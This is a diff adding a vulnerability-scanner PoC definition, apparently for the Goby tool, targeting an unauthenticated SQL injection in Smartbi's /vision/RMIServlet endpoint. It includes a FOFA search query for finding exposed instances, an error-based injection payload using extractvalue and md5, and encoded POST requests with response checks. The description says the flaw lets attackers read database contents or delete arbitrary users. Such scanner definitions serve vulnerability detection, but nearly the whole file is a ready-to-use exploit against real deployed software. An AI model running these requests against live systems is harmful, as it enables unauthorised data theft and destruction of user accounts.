@@ -1,0 +1,121 @@
+{
+  "Name": "Smartbi某接口存在SQL注入，无需身份认证的攻击者可利用该漏洞查看数据库中的敏感信息或删除任意用户",
+  "Description": "Smartbi是企业级商业智能和大数据分析平台，经过多年的持续发展，整合了各行业的数据分析和决策支持的功能需求，包括企业级报表、数据可视化分析、自助分析平台、数据挖掘建模、AI智能分析等。此系统多用于银行、保险、证券、国有企业、政府和教育领域。",
+  "Product": "Smartbi",
+  "Homepage": "http://www.smartbi.com.cn/",
+  "DisclosureDate": "2020-08-06",
+  "Author": "gobysec@gmail.com",
+  "FofaQuery": "app=\"Smartbi\"|| body=\"gcfutil = jsloader.resolve('smartbi.gcf.gcfutil')\"",
+  "Level": "1",
+  "Impact": "攻击者查看数据库信息及删除任意用户,delete注入,不建议使用,受影响的范围有： Smartbi V9、V8、V7、V6",
+  "Recommendation": "官网下载补丁更新:http://oss.smartbi.com.cn:82/insight/",
+  "References": [
+    "http://fofa.so"
+  ],
+  "HasExp": true,
+  "ExpParams": [
+	{
+      "Name": "sql",
+      "Type": "input",
+      "Value": "extractvalue(1,concat(char(126),(md5(123)),char(126)))"
+    }
+  ],
+  "ExpTips": {
+    "Type": "",
+    "Content": ""
+  },
+  "ScanSteps": [
+            "OR",
+            {
+                  "Request": {
+						"set_variable": ["coderequestEn|define|text|Vctw6_R-Wp4gRip+hpSzDp4D+/JV/JV/uu/u9/ut/u7pCk4(ikg(SQpA1/utiw6i(kAiI(4A1uME,AdhJA1uNEE/utiI(4A1uMEE/um/u7/ut/u7/u9/uu/JT/JT"],
+                        "method": "POST",
+                        "uri": "/vision/RMIServlet",
+                        "follow_redirect": false,
+						"header": {
+								"Content-Type": "application/x-www-form-urlencoded"
+                        },
+                        "data_type": "text",
+                        "data": "encode={{{coderequestEn}}}"
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+
+                                          {
+                                                "type": "item",
+                                                "variable": "$code",
+                                                "operation": "==",
+                                                "value": "200",
+                                                "bz": ""
+                                          },
+                                          {
+                                                "type": "item",
+                                                "variable": "$body",
+                                                "operation": "contains",
+                                                "value": "nyEIp7q0pw7nr",
+                                                "bz": "MYSQL"
+                                          }
+
+
+                        ]
+                  },
+                  "SetVariable": []
+            },
+			{
+                  "Request": {
+						"set_variable": ["coderequestEn|define|text|Vctw6_R-Wp4gRip+hpSzDp4D+/JV/JV/uu/u9/ut/u7pCk4(ikg(SQpA1/utiw6i(kAiI(4A1uME,AdhJA1uNEE/utiI(4A1uMEE/um/u7/ut/u7/u9/uu/JT/JT"],
+                        "method": "POST",
+                        "uri": "/vision/RMIServlet",
+                        "follow_redirect": false,
+						"header": {
+								"Content-Type": "application/x-www-form-urlencoded"
+                        },
+                        "data_type": "text",
+                        "data": "encode={{{coderequestEn}}}"
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+
+                                          {
+                                                "type": "item",
+                                                "variable": "$code",
+                                                "operation": "==",
+                                                "value": "200",
+                                                "bz": ""
+                                          },
+                                          {
+                                                "type": "item",
+                                                "variable": "$body",
+                                                "operation": "contains",
+                                                "value": "s)P)D)fM(hP)s",
+                                                "bz": ""
+                                          },
+                                          {
+                                                "type": "item",
+                                                "variable": "$body",
+                                                "operation": "contains",
+                                                "value": "jRmwI",
+                                                "bz": ""
+                                          }
+                        ]
+                  },
+                  "SetVariable": []
+            }
+
+      ],
+  "ExploitSteps": null,
+  "Tags": ["sqli"],
+  "CVEIDs": null,
+  "CVSSScore": null,
+  "AttackSurfaces": {
+    "Application": ["Smartbi"],
+    "Support": null,
+    "Service": null,
+    "System": null,
+    "Hardware": null
+  }
+}
